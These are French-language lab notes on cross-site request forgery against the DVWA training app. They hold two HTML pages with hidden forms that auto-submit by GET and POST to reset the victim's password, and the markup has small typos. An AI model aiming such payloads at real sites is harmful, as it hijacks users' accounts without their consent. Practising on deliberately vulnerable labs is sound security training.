# CSRF - Cross-Site Request Forgery

## HTTP methode GET

Exemple d'uilisation sur DVWA (Low):

```html
<!DOCTYPE html>
html lang="fr">	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content"IE=edge">
		<title></title>
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
	</head>
	<body>
		<header>
		</header>
		<main>
			<form id="my_form" method="GET" action="<mon_site>">
				<input type="hidden" name="password_new" value="azerty123+" />
				<input type="hidden" name="password_conf" value="azerty123+" />
				<input type="hidden" name="Change" value="Change" />
			</form>
			<script>document.getElementById("my_form").submit();</script>
		</main>
		<footer>
		</footer>
	</body>
</html>
```
Résultat: "http://<mon_site>/?password_new=azerty123%2B&password_conf=azerty123%2B&Change=Change"


## HTTP methode = POST

```html
<!DOCTYPE html>
<html lang="fr">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content"IE=edge">
		<title></title>
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
	</head>
	<body>
		<header>
		</header>
		<main>
			<form id="my_form" method="POST" action="">
				<input type="URL" name="password_new" value="azerty123+" />
				<input type="URL" name="password_conf" value="azerty123+" />
				<input type="URL" name="Change" value="Change" />
			</form>
			<script>document.getElementById("my_form").submit();</script>
		</main>
		<footer>
		</footer>
	</body>
</html>
```
